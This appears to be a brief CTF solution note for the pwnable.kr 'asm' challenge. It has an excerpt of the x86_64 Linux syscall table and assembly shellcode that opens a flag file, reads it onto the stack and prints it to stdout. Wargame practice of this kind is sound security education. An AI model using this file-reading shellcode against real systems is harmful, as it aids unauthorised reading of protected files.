
assembly:

http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/

%rax	System call	%rdi	%rsi	%rdx	%r10	%r8	%r9
0	sys_read	unsigned int fd	char *buf	size_t count			
1	sys_write	unsigned int fd	const char *buf	size_t count			
2	sys_open	const char *filename	int flags	int mode			



filetoopen db 'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong',0

sub rsp, 0x100

# open
#mov rdx, 0644o
#mov rsi, 0 # O_RONLY
mov rdi, filetoopen
mov rax, 2
syscall
mov rbx, rax # fd

# read
mov rdx, 0x100
mov rsi, rsp
mov rdi, rbx
mov rax, 0
syscall

# close
mov rdi, rbx
mov rax, 3
syscall

# write
mov rdx, 0x100
mov rsi, rsp
mov rdi, 1
mov rax, 1
syscall
